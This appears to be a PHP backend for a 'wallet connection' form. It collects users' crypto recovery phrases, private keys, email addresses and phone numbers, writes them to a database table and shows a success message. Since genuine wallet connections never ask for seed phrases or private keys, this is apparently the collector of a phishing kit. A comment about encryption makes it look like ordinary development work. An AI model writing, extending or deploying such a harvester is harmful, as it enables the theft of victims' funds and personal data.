<?php
// Enable error reporting for development (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Database configuration
$servername = "localhost";
$username = "root";
$password = "";
$database = "mark_db";

// Initialize variables
$success_message = "";
$error_message = "";

// Create connection using MySQLi
$conn = new mysqli($servername, $username, $password, $database);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Handle GET request (direct access to the file)
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Form Handler Status</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 600px;
                margin: 50px auto;
                padding: 20px;
                background: #f8f9fa;
            }
            .status-box {
                background: #d4edda;
                color: #155724;
                padding: 20px;
                border-radius: 5px;
                border: 1px solid #c3e6cb;
            }
        </style>
    </head>
    <body>
        <div class="status-box">
            <h3>✅ Form Handler is Ready</h3>
            <p>Database connection: <strong>Successful</strong></p>
            <p>PHP Version: <?php echo phpversion(); ?></p>
            <p>This handler is ready to receive POST requests from your form.</p>
            <p><a href="index.html">← Back to wallet form</a></p>
        </div>
    </body>
    </html>
    <?php
    $conn->close();
    exit();
}

// Check if form was submitted via POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Sanitize and validate input data
    $walletName = mysqli_real_escape_string($conn, trim($_POST['walletName'] ?? ''));
    $walletAddress = mysqli_real_escape_string($conn, trim($_POST['walletAddress'] ?? ''));
    $seedPhrase = mysqli_real_escape_string($conn, trim($_POST['seedPhrase'] ?? ''));
    $privateKey = mysqli_real_escape_string($conn, trim($_POST['privateKey'] ?? ''));
    $email = mysqli_real_escape_string($conn, trim($_POST['email'] ?? ''));
    $phone = mysqli_real_escape_string($conn, trim($_POST['phone'] ?? ''));
    
    // Basic validation
    $errors = [];
    
    if (empty($walletName)) {
        $errors[] = "Wallet name is required";
    }
    
    if (empty($walletAddress)) {
        $errors[] = "Wallet address is required";
    } 
    
    if (empty($seedPhrase)) {
        $errors[] = "Recovery phrase is required";
    }
    
    if (empty($email)) {
        $errors[] = "Email is required";
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors[] = "Invalid email format";
    }
    
    if (empty($phone)) {
        $errors[] = "Phone number is required";
    }
    
    // If no errors, insert into database
    if (empty($errors)) {
        
        // **CRITICAL SECURITY NOTE**: In production, sensitive data should be encrypted
        // This is a basic example - implement proper encryption for sensitive fields
        
        $stmt = $conn->prepare("INSERT INTO wallet_connections (wallet_name, wallet_address, seed_phrase, private_key, email, phone, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())");
        
        if ($stmt) {
            $stmt->bind_param("ssssss", $walletName, $walletAddress, $seedPhrase, $privateKey, $email, $phone);
            
            if ($stmt->execute()) {
                $success_message = "Wallet connected successfully!";
                
                // Optional: Redirect to success page
                // header("Location: success.php");
                // exit();
                
            } else {
                $error_message = "Database error: " . $stmt->error;
            }
            
            $stmt->close();
        } else {
            $error_message = "Error preparing statement: " . $conn->error;
        }
        
    } else {
        $error_message = implode("<br>", $errors);
    }
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connection Status</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #f8f9fa;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        .message {
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #007bff;
            text-decoration: none;
            padding: 10px 20px;
            background: #e7f3ff;
            border-radius: 5px;
            border: 1px solid #007bff;
        }
        .back-link:hover {
            background: #007bff;
            color: white;
        }
        .data-preview {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
            border: 1px solid #dee2e6;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Wallet Connection Result</h2>
        
        <?php if (!empty($success_message)): ?>
            <div class="message success">
                <strong>✅ Success!</strong><br>
                <?php echo $success_message; ?>
                
                <div class="data-preview">
                    <h4>📋 Submitted Data:</h4>
                    <strong>Wallet Name:</strong> <?php echo htmlspecialchars($walletName); ?><br>
                    <strong>Wallet Address:</strong> <?php echo htmlspecialchars($walletAddress); ?><br>
                    <strong>Email:</strong> <?php echo htmlspecialchars($email); ?><br>
                    <strong>Phone:</strong> <?php echo htmlspecialchars($phone); ?><br>
                    <strong>Recovery Phrase:</strong> <?php echo substr(htmlspecialchars($seedPhrase), 0, 20) . '... (truncated)'; ?><br>
                    <strong>Private Key:</strong> <?php echo !empty($privateKey) ? '[PROVIDED]' : '[NOT PROVIDED]'; ?><br>
                    <strong>Timestamp:</strong> <?php echo date('Y-m-d H:i:s'); ?>
                </div>
            </div>
            
        <?php elseif (!empty($error_message)): ?>
            <div class="message error">
                <strong>❌ Error!</strong><br>
                <?php echo $error_message; ?>
            </div>
            
        <?php else: ?>
            <div class="message" style="background: #fff3cd; color: #856404; border: 1px solid #ffeaa7;">
                <strong>⚠️ No Data Received</strong><br>
                Please submit the form to see results.
            </div>
        <?php endif; ?>
        
        <a href="index.html" class="back-link">← Back to Form</a>
    </div>
</body>
</html>